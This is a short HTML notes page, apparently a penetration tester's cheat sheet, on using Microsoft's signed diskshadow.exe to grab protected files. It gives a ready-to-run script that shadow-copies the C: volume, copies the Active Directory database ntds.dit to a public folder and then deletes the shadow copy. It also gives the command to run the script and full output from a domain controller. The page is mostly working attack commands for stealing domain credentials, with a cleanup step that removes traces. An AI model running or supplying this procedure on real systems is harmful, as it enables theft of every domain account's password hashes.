<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DiskShadow</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Grab Protected Files - DiskShadow</h1></strong><br />DiskShadow is a Microsoft signed binary.<br />It&#39;s used to assist administrators with operations related to the Volume Shadow Copy Service (VSS).<br /><br />Like <code>vssadmin.exe</code>, it can be used to access protected files.<br />• <a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/</a><br /><br /><code>diskshadow.exe</code> has 2 modes:<br />• interactive<br />• script<br /><br /><strong><h3>## Write Script</h3></strong><br />You can write into a script all the commands needed to extract NTDS.dit.<br />Save where it an be accessed - e.g. <code>C:\Users\Public\diskshadow-script.txt</code><br />• copy location of NTDS.dit must already exist/be accessible<br /><div class="codebox"><div class="codebox">set&nbsp;context&nbsp;persistent&nbsp;nowriters<br />add&nbsp;volume&nbsp;c:&nbsp;alias&nbsp;someAlias<br />create<br />expose&nbsp;%someAlias%&nbsp;z:<br />exec&nbsp;&quot;cmd.exe&quot;&nbsp;/c&nbsp;copy&nbsp;z:\windows\ntds\ntds.dit&nbsp;C:\Users\Public\ntds.dit<br />delete&nbsp;shadows&nbsp;volume&nbsp;%someAlias%<br />reset</div></div><br /><br /><strong><h2>## Execute</h2></strong><br />diskshadow.exe MUST be run from <code>C:\Windows\System32</code>, otherwise script execution will fail.<br /><code>diskshadow.exe /s C:\Users\Public\diskshadow-script.txt</code><br /><br />Example output:<br /><div class="codebox"><div class="codebox">PS&nbsp;C:\Windows\System32&gt;&nbsp;diskshadow.exe&nbsp;/s&nbsp;C:\Users\Public\diskshadow-script.txt<br />Microsoft&nbsp;DiskShadow&nbsp;version&nbsp;1.0<br />Copyright&nbsp;(C)&nbsp;2013&nbsp;Microsoft&nbsp;Corporation<br />On&nbsp;computer:&nbsp;&nbsp;CDC-TOKYO,&nbsp;&nbsp;17/04/2020&nbsp;15:13:48<br /><br />-&gt;&nbsp;set&nbsp;context&nbsp;persistent&nbsp;nowriters<br />-&gt;&nbsp;add&nbsp;volume&nbsp;c:&nbsp;alias&nbsp;someAlias<br />-&gt;&nbsp;create<br />Alias&nbsp;someAlias&nbsp;for&nbsp;shadow&nbsp;ID&nbsp;{d4540998-4260-43be-bc67-2fa6422f65dd}&nbsp;set&nbsp;as&nbsp;environment&nbsp;variable.<br />Alias&nbsp;VSS_SHADOW_SET&nbsp;for&nbsp;shadow&nbsp;set&nbsp;ID&nbsp;{61ac0ca7-819e-4def-883d-8734caa636d4}&nbsp;set&nbsp;as&nbsp;environment&nbsp;variable.<br /><br />Querying&nbsp;all&nbsp;shadow&nbsp;copies&nbsp;with&nbsp;the&nbsp;shadow&nbsp;copy&nbsp;set&nbsp;ID&nbsp;{61ac0ca7-819e-4def-883d-8734caa636d4}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Shadow&nbsp;copy&nbsp;ID&nbsp;=&nbsp;{d4540998-4260-43be-bc67-2fa6422f65dd}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%someAlias%<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Shadow&nbsp;copy&nbsp;set:&nbsp;{61ac0ca7-819e-4def-883d-8734caa636d4}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%VSS_SHADOW_SET%<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Original&nbsp;count&nbsp;of&nbsp;shadow&nbsp;copies&nbsp;=&nbsp;1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Original&nbsp;volume&nbsp;name:&nbsp;\\?\Volume{5e9702a1-eca8-4f6e-9503-82471f0b7bfc}\&nbsp;[C:\]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Creation&nbsp;time:&nbsp;17/04/2020&nbsp;15:13:48<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Shadow&nbsp;copy&nbsp;device&nbsp;name:&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Originating&nbsp;machine:&nbsp;cdc-tokyo.tokyo.umbrella.local<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Service&nbsp;machine:&nbsp;cdc-tokyo.tokyo.umbrella.local<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Not&nbsp;exposed<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Provider&nbsp;ID:&nbsp;{b5946137-7b9f-4925-af80-51abd60b20d5}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Attributes:&nbsp;&nbsp;No_Auto_Release&nbsp;Persistent&nbsp;No_Writers&nbsp;Differential<br /><br />Number&nbsp;of&nbsp;shadow&nbsp;copies&nbsp;listed:&nbsp;1<br />-&gt;&nbsp;expose&nbsp;%someAlias%&nbsp;z:<br />-&gt;&nbsp;%someAlias%&nbsp;=&nbsp;{d4540998-4260-43be-bc67-2fa6422f65dd}<br />The&nbsp;shadow&nbsp;copy&nbsp;was&nbsp;successfully&nbsp;exposed&nbsp;as&nbsp;z:\.<br />-&gt;&nbsp;exec&nbsp;&quot;cmd.exe&quot;&nbsp;/c&nbsp;copy&nbsp;z:\windows\ntds\ntds.dit&nbsp;C:\Users\Public\ntds.dit<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;file(s)&nbsp;copied.<br />-&gt;&nbsp;delete&nbsp;shadows&nbsp;volume&nbsp;%someAlias%<br />-&gt;&nbsp;%someAlias%&nbsp;=&nbsp;{d4540998-4260-43be-bc67-2fa6422f65dd}<br />Deleting&nbsp;shadow&nbsp;copy&nbsp;{d4540998-4260-43be-bc67-2fa6422f65dd}&nbsp;on&nbsp;volume&nbsp;\\?\Volume{5e9702a1-eca8-4f6e-9503-82471f0b7bfc}\<br />from&nbsp;provider&nbsp;{b5946137-7b9f-4925-af80-51abd60b20d5}&nbsp;[Attributes:&nbsp;0x00120019]...<br /><br />Number&nbsp;of&nbsp;shadow&nbsp;copies&nbsp;deleted:&nbsp;1<br />-&gt;&nbsp;reset</div></div><br /><br /><br /><br /></div>
</body>
</html>
